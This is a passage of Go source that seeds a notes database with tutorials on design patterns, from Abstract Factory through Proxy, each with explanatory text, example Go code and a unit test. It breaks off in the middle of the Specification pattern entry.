	create(db, "Pattern Abstract Factory\n(tags: pattern abstract factory)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Abstract Factory pattern refers to object-level generative patterns.\n\nThe Abstract Factory pattern provides a common interface for creating a family of related objects. This allows you to separate the functionality of the system from the internal implementation of each class, and access to these classes becomes possible through abstract interfaces.\n\nIn general, an abstract factory looks like this. For each of the families of objects, a concrete factory is created (heir to the abstract one), through which the products of this family are created.\n\nExample: There are two soda factories, Coca-Cola and Pepsi. These factories produce a family of products (objects) - bottle, cap, label, liquid. Each of these factories produces products that interact with each other and cannot live separately from each other. The Coca-Cola Factory cannot supply empty bottles to customers.\n\nTo implement a simple creation of a family of objects, there must be an interface on which the factory operates, and the factory must also release products with a specific interface. For example, the bottles of both companies have the same interface - they have a neck through which they are filled with liquid, we can also find out the volume of the bottles. Further, the bottles may differ in shape, volume or material, this does not concern us, we only need to know where to pour the liquid, as well as how much of this liquid is needed.\n\nRequired for implementation:\n\n1. The class of abstract factory AbstractFactory, which describes the general interface of the factory, from which each concrete factory will inherit;\n2. The abstract product class AbstractProduct, which describes the general product interface from which each specific product will inherit;\n3. The class of a specific factory Factory;\n4. The class of a specific product ProductA.\n5. The class of a specific product ProductB.\n\nAn abstract factory is a base class that describes the interface of concrete factories that create products. Concrete factory classes derived from it must implement this interface.\n\nAlso, an abstract factory should describe the abstract products that it produces, so that concrete factories would produce products with the necessary interfaces.\n\npackage abstract_factory\n\n// AbstractFactory provides an interface for creating families of related objects.\ntype AbstractFactory interface {\n  CreateWater(volume float64) AbstractWater\n  CreateBottle(volume float64) AbstractBottle\n}\n// AbstractWater provides a water interface.\ntype AbstractWater interface {\n  GetVolume() float64\n}\n// AbstractBottle provides a bottle interface.\ntype AbstractBottle interface {\n  PourWater(water AbstractWater) // Bottle interacts with a water.\n  GetBottleVolume() float64\n  GetWaterVolume() float64\n}\n// CocaColaFactory implements AbstractFactory interface.\ntype CocaColaFactory struct {\n}\n// NewCocaColaFactory is the CocaColaFactory constructor.\nfunc NewCocaColaFactory() AbstractFactory {\n  return &CocaColaFactory{}\n}\n// CreateWater implementation.\nfunc (f *CocaColaFactory) CreateWater(volume float64) AbstractWater {\n  return &CocaColaWater{volume: volume}\n}\n// CreateBottle implementation.\nfunc (f *CocaColaFactory) CreateBottle(volume float64) AbstractBottle {\n  return &CocaColaBottle{volume: volume}\n}\n// CocaColaWater implements AbstractWater.\ntype CocaColaWater struct {\n  volume float64 // Volume of drink.\n}\n// GetVolume returns volume of drink.\nfunc (w *CocaColaWater) GetVolume() float64 {\n  return w.volume\n}\n// CocaColaBottle implements AbstractBottle.\ntype CocaColaBottle struct {\n  water  AbstractWater // Bottle must contain a drink.\n  volume float64       // Volume of bottle.\n}\n// PourWater pours water into a bottle.\nfunc (b *CocaColaBottle) PourWater(water AbstractWater) {\n  b.water = water\n}\n// GetBottleVolume returns volume of bottle.\nfunc (b *CocaColaBottle) GetBottleVolume() float64 {\n  return b.volume\n}\n// GetWaterVolume returns volume of water.\nfunc (b *CocaColaBottle) GetWaterVolume() float64 {\n  return b.water.GetVolume()\n}\n\nfunc TestAbstractFactory(t *testing.T) {\n  cocacolaFactory := NewCocaColaFactory()\n  cocacolaWater := cocacolaFactory.CreateWater(2.5)\n  cocacolaBottle := cocacolaFactory.CreateBottle(2.5)\n  cocacolaBottle.PourWater(cocacolaWater)\n  if cocacolaBottle.GetWaterVolume() != cocacolaBottle.GetBottleVolume() {\n    t.Errorf(\"Expect volume to %.1fL, but %.1fL\", cocacolaBottle.GetWaterVolume(), cocacolaBottle.GetBottleVolume())\n  }\n}")
	create(db, "Pattern Builder\n(tags: pattern builder)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Builder pattern is one of the object-level generative patterns.\n\nThe Builder pattern defines a step-by-step process for building a complex product. After the last part is built, the product can be used.\n\nIn the example of the Abstract Factory pattern, the example of two factories Coca-Cola and Percy was given. Take one factory, it produces a complex product with 4 parts (cap, bottle, label, drink) that must be applied in the right order. You cannot first take the lid, bottle, screw on the lid, and then try to pour a drink there. To implement an object, a bottle of Coca-Cola that is supplied to a client, we need a Builder pattern.\n\nIt is important to understand that a complex object is not necessarily an object that operates with several other objects in the sense of OOP. For example, we need to get a document consisting of a title, introduction, content and conclusion. Our document is a complex object. We will use the Builder pattern to create a unified document compilation order.\n\nRequired for implementation:\n\n1. Class Director, which will manage the builder and give him commands in the right order, and the builder will execute them;\n2. The base abstract class Builder, which describes the interface of the builder, the commands that he must execute;\n3. The ConcreteBuilder class, which implements the builder interface and interacts with a complex object;\n4. The class of the complex object Product.\n\npackage builder\n\n// Builder provides a builder interface.\ntype Builder interface {\n  MakeHeader(str string)\n  MakeBody(str string)\n  MakeFooter(str string)\n}\n// Director implements a manager\ntype Director struct {\n  builder Builder\n}\n// Construct tells the builder what to do and in what order.\nfunc (d *Director) Construct() {\n  d.builder.MakeHeader(\"Header\")\n  d.builder.MakeBody(\"Body\")\n  d.builder.MakeFooter(\"Footer\")\n}\n// ConcreteBuilder implements Builder interface.\ntype ConcreteBuilder struct {\n  product *Product\n}\n// MakeHeader builds a header of document..\nfunc (b *ConcreteBuilder) MakeHeader(str string) {\n  b.product.Content += \"<header>\" + str + \"</header>\"\n}\n// MakeBody builds a body of document.\nfunc (b *ConcreteBuilder) MakeBody(str string) {\n  b.product.Content += \"<article>\" + str + \"</article>\"\n}\n// MakeFooter builds a footer of document.\nfunc (b *ConcreteBuilder) MakeFooter(str string) {\n  b.product.Content += \"<footer>\" + str + \"</footer>\"\n}\n// Product implementation.\ntype Product struct {\n  Content string\n}\n// Show returns product.\nfunc (p *Product) Show() string {\n  return p.Content\n}\n\nfunc TestBuilder(t *testing.T) {\n  expect := \"<header>Header</header>\" +\n    \"<article>Body</article>\" +\n    \"<footer>Footer</footer>\"\n  product := new(Product)\n  director := Director{&ConcreteBuilder{product}}\n  director.Construct()\n  result := product.Show()\n  if result != expect {\n    t.Errorf(\"Expect result to %s, but %s\", result, expect)\n  }\n}")
	create(db, "Pattern Factory Method\n(tags: pattern factory method)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Factory Method pattern refers to class-level generative patterns and focuses only on relationships between classes.\n\nThe Factory Method pattern is useful when the system must remain easily extensible by adding new types of objects. This pattern is the basis for all generative patterns and can be easily transformed to suit the needs of the system. Therefore, if the developer is faced with unclear requirements for the product or the way of organizing interaction between products is not clear, then first you can use the Factory Method pattern until all the requirements are fully formed.\n\nThe Factory Method pattern is used to create objects with a specific interface, which are provided by descendants. In other words, there is a base abstract factory class that says that each inheriting factory must implement such and such a method to create its products.\n\nThe implementation of the factory method can be different, in most cases it depends on the implementation language. It can be polymorphism or a parameterized method.\n\nExample: We receive files of three extensions .txt, .png, .doc. Depending on the file extension, we have to save it in one of the directories / file / txt /, / file / png / and / file / doc /. This means that we will have a file factory with a parameterized factory method that accepts the path to a file that we need to store in one of the directories. This factory method returns an object to us, using which we can manipulate our file (save, see the type and directory for saving). Note that we do not specify in any way which instance of the product object we need to get, this is done by the factory method by determining the file extension and, based on it, choosing the appropriate product class. Thus, if our system expands and the available file extensions become, for example, 25, then we just need to change the factory method and implement the product classes.\n\nRequired for implementation:\n\n1. The basic abstract class Creator, which describes the interface that a specific factory must implement to produce products. This base class describes a factory method.\n2. The base Product class, which describes the product interface returned by the factory. All products returned by the factory must adhere to the same interface.\n3. The class of a specific factory for the production of ConcreteCreator products. This class must implement a factory method;\n4. Class of the real product ConcreteProductA;\n5. The class of the real product ConcreteProductB;\n6. The class of the real product ConcreteProductC.\n\nFactory Method differs from Abstract Factory in that Abstract Factory produces a family of objects, these objects are different, have different interfaces, but interact with each other. While Factory Method produces products that adhere to the same interface and these products are not interconnected, they do not interact.\n\npackage factory_method\n\nimport \"log\"\n\n// Creater provides a factory interface.\ntype Creater interface {\n  CreateProduct(action string) Producter // Factory Method\n}\n// Producter provides a product interface.\n// All products returned by factory must provide a single interface.\ntype Producter interface {\n  Use() string // Every product should be can be used\n}\n// ConcreteCreater implements Creater interface.\ntype ConcreteCreater struct {\n}\n// NewCreater is the ConcreteCreater constructor.\nfunc NewCreater() Creater {\n  return &ConcreteCreater{}\n}\n// CreateProduct is a Factory Method\nfunc (p *ConcreteCreater) CreateProduct(action string) Producter {\n  var product Producter\n  switch action {\n  case \"A\":\n    product = &ConcreteProductA{action}\n  case \"B\":\n    product = &ConcreteProductB{action}\n  case \"C\":\n    product = &ConcreteProductC{action}\n  default:\n    log.Fatalln(\"Unknown Action\")\n  }\n  return product\n}\n// ConcreteProductA implements product \"A\"\ntype ConcreteProductA struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductA) Use() string {\n  return p.action\n}\n// ConcreteProductB implements product \"B\"\ntype ConcreteProductB struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductB) Use() string {\n  return p.action\n}\n// ConcreteProductC implements product \"C\"\ntype ConcreteProductC struct {\n  action string\n}\n// Use returns product action\nfunc (p *ConcreteProductC) Use() string {\n  return p.action\n}\n\nfunc TestFactoryMethod(t *testing.T) {\n  assert := []string{\"A\", \"B\", \"C\"}\n  factory := NewCreater()\n  products := []Producter{\n    factory.CreateProduct(\"A\"),\n    factory.CreateProduct(\"B\"),\n    factory.CreateProduct(\"C\"),\n  }\n  for i, product := range products {\n    if action := product.Use(); action != assert[i] {\n      t.Errorf(\"Expect action to %s, but %s.\\n\", assert[i], action)\n    }\n  }\n}")
	create(db, "Pattern Prototype\n(tags: pattern prototype)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Prototype pattern is an object-level procreative pattern.\n\nThe Prototype pattern allows you to create new objects by copying (cloning) a previously created original product object (prototype).\n\nThe pattern describes the process of creating clone objects based on an existing prototype object, in other words, the Prototype pattern describes how the cloning process is organized.\n\nRequired for implementation:\n\n1. The base class Prototype, which declares the cloning interface. All its inheriting classes must implement this cloning mechanism;\n2. The ConcretePrototypeA product class that must implement this prototype;\n3. The ConcretePrototypeB product class that must implement this prototype.\n\nUsually the cloning operation occurs through the clone () method, which is described in the base class and must be implemented by each product.\n\npackage prototype\n\n// Prototyper provides a cloning interface.\ntype Prototyper interface {\n  Clone() Prototyper\n  GetName() string\n}\n// ConcreteProduct implements product \"A\"\ntype ConcreteProduct struct {\n  name string // Имя продукта\n}\n// NewConcreteProduct is the Prototyper constructor.\nfunc NewConcreteProduct(name string) Prototyper {\n  return &ConcreteProduct{\n    name: name,\n  }\n}\n// GetName returns product name\nfunc (p *ConcreteProduct) GetName() string {\n  return p.name\n}\n// Clone returns a cloned object.\nfunc (p *ConcreteProduct) Clone() Prototyper {\n  return &ConcreteProduct{p.name}\n}\n\nfunc TestPrototype(t *testing.T) {\n  product := NewConcreteProduct(\"A\")\n  cloneProduct := product.Clone()\n  if cloneProduct.GetName() != product.GetName() {\n    t.Error(\"Expect name \\\"A\\\" to equal, but not equal.\")\n  }\n}")
	create(db, "Pattern Singleton\n(tags: pattern singleton)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Singleton pattern is an object-level ancestor pattern.\nThe pattern controls the creation of a single instance of a certain class and provides access to it.\nIn other words, Singleton ensures that the class has only one instance and provides an access point to it through a factory method.\n\nRequired for implementation:\n\n1. The GetInstance function, which creates an instance of the Singleton class only once. If an instance has already been created before, then it simply returns this instance.\n\npackage singleton\n\nimport \"sync\"\n\n// Singleton implementation.\ntype Singleton struct {\n}\nvar (\n  instance *Singleton\n  once     sync.Once\n)\n// GetInstance returns singleton\nfunc GetInstance() *Singleton {\n  once.Do(func() {\n    instance = &Singleton{}\n  })\n  return instance\n}\n\nfunc TestSingleton(t *testing.T) {\n  instance1 := GetInstance()\n  instance2 := GetInstance()\n  if instance1 != instance2 {\n    t.Error(\"Objects are not equal!\\n\")\n  }\n}")
	create(db, "Pattern Adapter\n(tags: pattern adapter)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Adapter pattern is a class-level structural pattern.\n\nOften in a new project, developers want to reuse existing code. For example, existing classes may have the desired functionality and yet have incompatible interfaces. In such cases, the Adapter pattern should be used.\n\nThe meaning of this pattern is that if you have a class and its interface is not compatible with the code of your system, then in order to resolve this conflict, we do not change the code of this class, but write an adapter for it. In other words, Adapter adapts existing code to the required interface (it is an adapter).\n\nRequired for implementation:\n\n1. Target interface, describing the target interface (the interface with which our system would like to work);\n2. The Adaptee class, which our system must adapt for itself;\n3. An Adapter class, an adapter that implements the target interface.\n\npackage adapter\n\n// Target provides an interface with which the system should work.\ntype Target interface {\n  Request() string\n}\n// Adaptee implements system to be adapted.\ntype Adaptee struct {\n}\n// NewAdapter is the Adapter constructor.\nfunc NewAdapter(adaptee *Adaptee) Target {\n  return &Adapter{adaptee}\n}\n// SpecificRequest implementation.\nfunc (a *Adaptee) SpecificRequest() string {\n  return \"Request\"\n}\n// Adapter implements Target interface and is an adapter.\ntype Adapter struct {\n  *Adaptee\n}\n// Request is an adaptive method.\nfunc (a *Adapter) Request() string {\n  return a.SpecificRequest()\n}\n\nfunc TestAdapter(t *testing.T) {\n  adapter := NewAdapter(&Adaptee{})\n  req := adapter.Request()\n  if req != \"Request\" {\n    t.Errorf(\"Expect volume to %s, but %s\", \"Request\", req)\n  }\n}")
	create(db, "Pattern Bridge\n(tags: pattern bridge)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Bridge pattern refers to object-level structural patterns.\n\nThe Bridge pattern allows you to separate an object into abstraction and implementation so that they can change independently of each other.\n\nIf several implementations are possible for one abstraction, then inheritance is usually used. However, this approach is not always convenient, since inheritance tightly ties the implementation to the abstraction, which makes it difficult to independently modify and complicate their reuse.\n\nThe pattern should be used when we have an abstraction and several implementations of it. Of course, it makes no sense to separate the abstraction from the implementation if there can be only one implementation.\n\nI have not found any adequate description of the \"Bridge\" pattern. Everything that I have come across is either not true and examples are sucked from the finger or very blurry. From what I understand and can explain on my fingers - the Bridge is a tricky aggregation. The class that implements the product, implements the interface of the aggregated class, which is slipped at the stage of creating an instance of the product class.\n\nAs I understand it ... we have 3 cars and 3 different engines. Every engine fits every machine, i.e. it implements its interface. If we do this by inheritance, we get 9 different classes. It turns out that each vehicle has 3 modifications. This is inconvenient, so we will slip the engine at the stage of creating the car. Also, each engine can run on a different fuel, diesel or gasoline, so as not to produce 6 different implementations, when creating an engine, we will slip the type of fuel into it.\n\nTo implement the pattern in this example, you need to add a field in the base car class to store a pointer to the implementation type, the value of which the class will receive in its constructor, and call the methods of the nested object, if necessary.\n\nRequired for implementation:\n\n1. Base abstract class (in our case, describing a car);\n2. A class that implements the base class. It has a property in which we will slip the pointer to the engine used (the car can work with any of the presented engines);\n3. Abstraction of the engine;\n4. Realization of the engine.\n\nIn general, the property storing a pointer to the used object is a bridge. We can slip different objects into it, the main thing is that they have the same interface.\n\npackage bridge\n\n// Carer provides car interface.\ntype Carer interface {\n  Rase() string\n}\n// Enginer provides engine interface.\ntype Enginer interface {\n  GetSound() string\n}\n// Car implementation.\ntype Car struct {\n  engine Enginer\n}\n// NewCar is the Car constructor.\nfunc NewCar(engine Enginer) Carer {\n  return &Car{\n    engine: engine,\n  }\n}\n// Rase implementation.\nfunc (c *Car) Rase() string {\n  return c.engine.GetSound()\n}\n// EngineSuzuki implements Suzuki engine.\ntype EngineSuzuki struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineSuzuki) GetSound() string {\n  return \"SssuuuuZzzuuuuKkiiiii\"\n}\n// EngineHonda implements Honda engine.\ntype EngineHonda struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineHonda) GetSound() string {\n  return \"HhoooNnnnnnnnnDddaaaaaaa\"\n}\n// EngineLada implements Lada engine.\ntype EngineLada struct {\n}\n// GetSound returns sound of the engine.\nfunc (e *EngineLada) GetSound() string {\n  return \"PhhhhPhhhhPhPhPhPhPh\"\n}\n\nfunc TestBridge(t *testing.T) {\n  expect := \"SssuuuuZzzuuuuKkiiiii\"\n  car := NewCar(&EngineSuzuki{})\n  sound := car.Rase()\n  if sound != expect {\n    t.Errorf(\"Expect sound to %s, but %s\", expect, sound)\n  }\n}")
	create(db, "Pattern Composite\n(tags: pattern composite)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Composite pattern refers to object-level structural patterns.\n\nThe Composite pattern groups similar objects into tree structures.\n\nArrays representing the branches of the tree will be used to build the tree.\n\nRequired for implementation:\n\n1. Basic abstract class Component which provides an interface for both branches and leaves of a tree;\n2. The Composite class that implements the Component interface and is a branch of the tree;\n3. The Leaf class, which implements the Component interface and is a leaf of the tree.\n\nNote that a leaf in a tree is a leaf node class and cannot have descendants (a branch or other leaf cannot grow from a leaf).\n\nBranches of a tree define the behavior of objects included in the tree structure, which have descendants, and also store the components of the tree themselves. In other words, branches can contain other branches and leaves.\n\nThe main purpose of the pattern is to provide a single interface to both the composite (branch) and the final (leaf) object, so that the client does not think about which object he is working with.\n\npackage composite\n\n// Component provides an interface for branches and leaves of a tree.\ntype Component interface {\n  Add(child Component)\n  Name() string\n  Child() []Component\n  Print(prefix string) string\n}\n// Directory implements branches of a tree\ntype Directory struct {\n  name   string\n  childs []Component\n}\n// Add appends an element to the tree branch.\nfunc (d *Directory) Add(child Component) {\n  d.childs = append(d.childs, child)\n}\n// Name returns name of the Component.\nfunc (d *Directory) Name() string {\n  return d.name\n}\n// Child returns child elements.\nfunc (d *Directory) Child() []Component {\n  return d.childs\n}\n// Print returns the branche in string representation.\nfunc (d *Directory) Print(prefix string) string {\n  result := prefix + \"/\" + d.Name() + \"\\n\"\n  for _, val := range d.Child() {\n    result += val.Print(prefix + \"/\" + d.Name())\n  }\n  return result\n}\n// File implements a leaves of a tree\ntype File struct {\n  name string\n}\n// Add implementation.\nfunc (f *File) Add(child Component) {\n}\n// Name returns name of the Component.\nfunc (f *File) Name() string {\n  return f.name\n}\n// Child implementation.\nfunc (f *File) Child() []Component {\n  return []Component{}\n}\n// Print returns the leave in string representation.\nfunc (f *File) Print(prefix string) string {\n  return prefix + \"/\" + f.Name() + \"\\n\"\n}\n// NewDirectory is constructor.\nfunc NewDirectory(name string) *Directory {\n  return &Directory{\n    name: name,\n  }\n}\n// NewFile is constructor.\nfunc NewFile(name string) *File {\n  return &File{\n    name: name,\n  }\n}\n\nfunc TestComposite(t *testing.T) {\n  expect := \"/root\\n/root/usr\\n/root/usr/B\\n/root/A\\n\"\n  rootDir := NewDirectory(\"root\")\n  usrDir := NewDirectory(\"usr\")\n  fileA := NewFile(\"A\")\n  rootDir.Add(usrDir)\n  rootDir.Add(fileA)\n  fileB := NewFile(\"B\")\n  usrDir.Add(fileB)\n  result := rootDir.Print(\"\")\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Decorator\n(tags: pattern decorator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nDecorator pattern refers to object-level structural patterns.\n\nThe Decorator pattern is used to extend the functionality of objects by dynamically adding new capabilities to an object. When implementing the pattern, the composition relation is used.\n\nThe essence of the decorator's work is to wrap the finished object with new functionality, while the entire original interface of the object remains accessible, by sending the decorator of all requests to the wrapped object.\n\nRequired for implementation:\n\n1. The base abstract class Component which provides an interface for the decorator and component classes;\n2. The ConcreteDecorator class, which implements the Component interface and reloads all methods of the component; if necessary, functionality is added to them;\n3. The ConcreteComponent class implements the Component interface and will be wrapped with a decorator.\n\nWith such a structure, it doesn't matter to us whether the component is a decorator or a concrete implementation, since they have the same interface, and we can make decorator chains. Thus, dynamically change the state and behavior of the object.\n\nI heard the example with Carlson and I really liked it. We have Carlson, we put a jumpsuit on him, thereby changing his state, then we put a propeller on his pants, thereby changing his behavior. The propeller can be removed, depending on the situation, by changing the behavior to the opposite, or you can wear a different overalls with different properties.\n\npackage decorator\n\n// Component provides an interface for a decorator and component.\ntype Component interface {\n  Operation() string\n}\n// ConcreteComponent implements a component.\ntype ConcreteComponent struct {\n}\n// Operation implementation.\nfunc (c *ConcreteComponent) Operation() string {\n  return \"I am component!\"\n}\n// ConcreteDecorator implements a decorator.\ntype ConcreteDecorator struct {\n  component Component\n}\n// Operation wraps operation of component\nfunc (d *ConcreteDecorator) Operation() string {\n  return \"<strong>\" + d.component.Operation() + \"</strong>\"\n}\n\nfunc TestDecorator(t *testing.T) {\n  expect := \"<strong>I am component!</strong>\"\n  decorator := &ConcreteDecorator{&ConcreteComponent{}}\n  result := decorator.Operation()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Facade\n(tags: pattern facade)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Facade pattern refers to object-level structural patterns.\n\nThe Facade pattern provides a high-level unified interface in the form of a set of method names to a set of related classes or objects of a subsystem, which makes it easier to use.\n\nDividing a complex system into subsystems simplifies the development process, and also helps to minimize the dependence of one subsystem on another. However, using such subsystems becomes quite difficult. One way to solve this problem is the Facade pattern. Our task is to make a simple, unified interface through which one could interact with subsystems.\n\nAn example is the car interface. Modern cars have a unified driver interface that hides a complex subsystem. Thanks to the use of sophisticated electronics that do most of the work for the driver, he can easily drive a car without thinking about how everything works there.\n\nRequired for implementation:\n\n1. The Facade class provides unified access for the subsystem classes;\n2. Subsystem class SubSystemA;\n3. Subsystem class SubSystemB;\n4. Subsystem class SubSystemC.\n\nNote that the facade is not the only point of access to the subsystem, nor does it limit the capabilities that might be needed by \"advanced\" users who want to work directly with the subsystem.\n\npackage facade\n\nimport \"strings\"\n\n// NewMan creates man.\nfunc NewMan() *Man {\n  return &Man{\n    house: &House{},\n    tree:  &Tree{},\n    child: &Child{},\n  }\n}\n// Man implements man and facade.\ntype Man struct {\n  house *House\n  tree  *Tree\n  child *Child\n}\n// Todo returns that man must do.\nfunc (m *Man) Todo() string {\n  result := []string{\n    m.house.Build(),\n    m.tree.Grow(),\n    m.child.Born(),\n  }\n  return strings.Join(result, \"\\n\")\n}\n// House implements a subsystem \"House\"\ntype House struct {\n}\n// Build implementation.\nfunc (h *House) Build() string {\n  return \"Build house\"\n}\n// Tree implements a subsystem \"Tree\"\ntype Tree struct {\n}\n// Grow implementation.\nfunc (t *Tree) Grow() string {\n  return \"Tree grow\"\n}\n// Child implements a subsystem \"Child\"\ntype Child struct {\n}\n// Born implementation.\nfunc (c *Child) Born() string {\n  return \"Child born\"\n}\n\nfunc TestFacade(t *testing.T) {\n  expect := \"Build house\\nTree grow\\nChild born\"\n  man := NewMan()\n  result := man.Todo()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Flyweight\n(tags: pattern flyweight)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Flyweight pattern refers to object-level structural patterns.\n\nThe Flyweight pattern is used to efficiently support a large number of small objects, it allows you to reuse small objects in different contexts.\n\nRequired for implementation:\n\n1. The FlyweightFactory class, which is a modified factory pattern for creating flyweight;\n2. Base abstract class Flyweight, to describe the general interface of flyweight;\n3. The ConcreteFlyweight class implements a flyweight that will replace the same small objects.\n\nThe bottom line is that we can request opportunists from the factory upon request, in turn, it will return those objects that have already been created, or create new ones. This means that we will use the already created objects, and not create even more, if the objects for ours already exist.\n\npackage flyweight\n\n// Flyweighter interface\ntype Flyweighter interface {\n  GetName() string\n  SetName(name string)\n}\n// FlyweightFactory implements a factory.\n// If a suitable flyweighter is in pool, then returns it.\ntype FlyweightFactory struct {\n  pool map[int]Flyweighter\n}\n// GetFlyweight creates or returns a suitable Flyweighter by state.\nfunc (f *FlyweightFactory) GetFlyweight(state int) Flyweighter {\n  if f.pool == nil {\n    f.pool = make(map[int]Flyweighter)\n  }\n  if _, ok := f.pool[state]; !ok {\n    f.pool[state] = &ConcreteFlyweight{state: state}\n  }\n  return f.pool[state]\n}\n// ConcreteFlyweight implements a Flyweighter interface.\ntype ConcreteFlyweight struct {\n  state int\n  name  string\n}\n// GetName returns name\nfunc (f *ConcreteFlyweight) GetName() string {\n  return \"My name: \" + f.name\n}\n// SetName sets a name\nfunc (f *ConcreteFlyweight) SetName(name string) {\n  f.name = name\n}\n\nfunc TestFlyweight(t *testing.T) {\n  expect := \"My name: Jeck\"\n  factory := new(FlyweightFactory)\n  flyweight1 := factory.GetFlyweight(1)\n  flyweight2 := factory.GetFlyweight(2)\n  flyweight3 := factory.GetFlyweight(3)\n  flyweight1.SetName(\"Jim\")\n  flyweight2.SetName(\"Jeck\")\n  flyweight3.SetName(\"Jill\")\n  flyweightN := factory.GetFlyweight(2)\n  result := flyweightN.GetName()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Proxy\n(tags: pattern proxy)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Proxy pattern refers to object-level structural patterns.\n\nThe Proxy pattern provides an object to control access to another object.\n\nAnother name for the pattern is \"Surrogate\". In this sense, it is an item or product that replaces any other item or product with which the surrogate has only some common properties, but it does not have all the qualities of the original item or product.\n\nThe Proxy pattern puts forward a number of important requirements, namely that the original object and its surrogate must interact with each other, and there must also be a possibility of replacing the original object, a surrogate at the place of its use, respectively, the interaction interfaces of the original object and its surrogate must coincide.\n\nIt will be easier for you to understand the pattern if you've watched the movie \"Surrogates\".\n\nRequired for implementation:\n\n1. Interface Subject, which is a common interface for a real object and its surrogate;\n2. The RealSubject class that implements the real object;\n3. The Proxy class that implements the surrogate object. Stores a reference to the real object, which allows the proxy to access the real object directly;\n\nFor example, the Proxy pattern can be used if we need to manage resource-intensive objects, but we don't want to instantiate such objects until they are actually used.\n\nYou might think this is the same as Adapter or Decorator. But...\n\nProxy provides the same interface to its object.\nAdapter provides a different interface.\nDecorator provides an advanced interface.\n\npackage proxy\n\n// Subject provides an interface for a real subject and its surrogate.\ntype Subject interface {\n  Send() string\n}\n// Proxy implements a surrogate.\ntype Proxy struct {\n  realSubject Subject\n}\n// Send sends a message\nfunc (p *Proxy) Send() string {\n  if p.realSubject == nil {\n    p.realSubject = &RealSubject{}\n  }\n  return \"<strong>\" + p.realSubject.Send() + \"</strong>\"\n}\n// RealSubject implements a real subject\ntype RealSubject struct {\n}\n// Send sends a message\nfunc (s *RealSubject) Send() string {\n  return \"I’ll be back!\"\n}\n\nfunc TestProxy(t *testing.T) {\n  expect := \"<strong>I’ll be back!</strong>\"\n  proxy := new(Proxy)\n  result := proxy.Send()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Specification\n(tags: pattern specification)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nA specification is a design pattern by which a business logic rule representation can be transformed into a chain of objects linked by Boolean logic operations.\n\n// Pattern Specification\n//\n// In the following example, we are retrieving invoices and sending them to a collection agency if\n//  1. they are overdue,\n//  2. notices have been sent, and\n//  3. they are not already with the collection agency.\n// This example is meant to show the end result of how the logic is 'chained' together.\n//\n// This usage example assumes a previously defined OverdueSpecification class\n// that is satisfied when an invoice's due date is 30 days or older,\n// a NoticeSentSpecification class that is satisfied when three notices\n// have been sent to the customer, and an InCollectionSpecification class\n// that is satisfied when an invoice has already been sent to the collection\n// agency. The implementation of these classes isn't important here.\n\npackage specification\n\n// Data for analysis\ntype Invoice struct {\n  Day    int\n  Notice int\n  IsSent bool\n}\n/////\n// Invoice Specification Interface\ntype Specification interface {\n  IsSatisfiedBy(Invoice) bool\n  And(Specification) Specification\n  Or(Specification) Specification\n  Not() Specification\n  Relate(Specification)\n}\n/////\n// Invoice BaseSpecification\ntype BaseSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *BaseSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return false\n}\n// Condition AND\nfunc (self *BaseSpecification) And(spec Specification) Specification {\n  a := &AndSpecification{\n    self.Specification, spec,\n  }\n  a.Relate(a)\n  return a\n}\n// Condition OR\nfunc (self *BaseSpecification) Or(spec Specification) Specification {\n  a := &OrSpecification{\n    self.Specification, spec,\n  }\n  a.Relate(a)\n  return a\n}\n// Condition NOT\nfunc (self *BaseSpecification) Not() Specification {\n  a := &NotSpecification{\n    self.Specification,\n  }\n  a.Relate(a)\n  return a\n}\n// Relate to specification\nfunc (self *BaseSpecification) Relate(spec Specification) {\n  self.Specification = spec\n}\n/////\n// AndSpecification\ntype AndSpecification struct {\n  Specification\n  compare Specification\n}\n// Check specification\nfunc (self *AndSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return self.Specification.IsSatisfiedBy(elm) && self.compare.IsSatisfiedBy(elm)\n}\n/////\n// OrSpecification\ntype OrSpecification struct {\n  Specification\n  compare Specification\n}\n// Check specification\nfunc (self *OrSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return self.Specification.IsSatisfiedBy(elm) || self.compare.IsSatisfiedBy(elm)\n}\n/////\n// NotSpecification\ntype NotSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *NotSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return !self.Specification.IsSatisfiedBy(elm)\n}\n/////\n// Invoice's due date is 30 days or older\ntype OverDueSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *OverDueSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return elm.Day >= 30\n}\n// Constructor\nfunc NewOverDueSpecification() Specification {\n  a := &OverDueSpecification{&BaseSpecification{}}\n  a.Relate(a)\n  return a\n}\n// Three notices have been sent to the customer\ntype NoticeSentSpecification struct {\n  Specification\n}\n// Check specification\nfunc (self *NoticeSentSpecification) IsSatisfiedBy(elm Invoice) bool {\n  return elm.Notice >= 3\n}\n// Constructor\nfunc NewNoticeSentSpecification() Specification {\n  